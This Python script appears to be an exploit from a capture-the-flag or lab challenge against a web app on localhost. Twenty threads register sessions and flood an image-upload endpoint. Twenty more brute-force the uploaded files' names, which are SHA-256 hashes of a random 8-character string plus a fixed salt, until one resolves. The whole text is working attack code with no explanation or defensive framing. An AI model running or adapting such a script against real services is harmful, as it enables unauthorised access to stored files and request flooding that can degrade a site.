import requests
import random
import hashlib
import threading
import time

url = "http://localhost:8080"

loop = True

def fileFind():
    global loop
    time.sleep(1000*60)
    
    while loop:
        li = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@$%^&*"

        rand = "".join([random.choice(li) for i in range(8)])
        #print(rand)
        md = hashlib.sha256()
        md.update(rand.encode())
        md.update("y54616".encode())
        hash=md.hexdigest()

        res = requests.get(url+"/uploads/"+hash+".jpg")

        if "Not Found" not in res.text:
            print(hash+".jpg")
            print(res.text)
            loop = False
        

def imageUpload():
    count=1
    while loop:
        try:
            cookies={"JSESSIONID":"74699B9237AA45BABE23C2EBFDC1D3A0"}

            res=requests.post(url+"/", data={"name":"yc54616"}, allow_redirects=False)
            setCookie = res.headers["Set-Cookie"].split(";")[0].split("=")
            cookies[setCookie[0]]=setCookie[1]

            if count % 100 == 0:
                print(count)

            requests.post(url+"/image/upload", cookies=cookies, files={'file': ('y54616.jpg', b"\xff\xd8\xff", 'image/jpg') })
            count+=1
        except:
            pass


for _ in range(20):
    t = threading.Thread(target=imageUpload)
    t.daemon = True
    t.start()

for _ in range(20):
    t1 = threading.Thread(target=fileFind)
    t1.daemon = True
    t1.start()
    
fileFind()